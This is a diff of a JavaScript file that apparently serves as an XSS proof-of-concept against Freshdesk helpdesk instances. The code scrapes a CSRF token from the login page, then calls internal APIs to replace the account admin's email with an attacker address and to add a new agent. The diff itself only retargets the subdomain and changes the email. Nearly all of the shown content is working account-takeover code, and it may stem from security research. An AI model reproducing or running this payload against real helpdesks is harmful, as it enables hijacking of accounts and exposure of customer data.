@@ -1,5 +1,5 @@
 async function getCsrfToken() {
-    const response = await fetch('https://akashus1.freshdesk.com/support/login')
+    const response = await fetch('https://usnavneel.freshdesk.com/support/login')
     const text = await response.text();
     const parser = new DOMParser();
     const doc = parser.parseFromString(text, 'text/html');
@@ -8,11 +8,11 @@ async function getCsrfToken() {
 }
 
 async function updateAccountAdmin(csrfToken) {
-    const url = 'https://akashus1.freshdesk.com/api/_/account_admin';
+    const url = 'https://usnavneel.freshdesk.com/api/_/account_admin';
     const data = {
         first_name: "XSS",
         last_name: "attack",
-        email: "dannyrishu13@gmail.com",
+        email: "danockrishu13@gmail.com",
         phone: 1111111111,
         company_name: "Navneel xss company"
     };
@@ -32,7 +32,7 @@ async function updateAccountAdmin(csrfToken) {
 }
 
 async function addAgent(csrfToken) {
-    const url = 'https://akashus1.freshdesk.com/api/_/agents';
+    const url = 'https://usnavneel.freshdesk.com/api/_/agents';
     const data = {
         name: "Navneel XSS",
         email: "rishu_xss@yahoo.com",
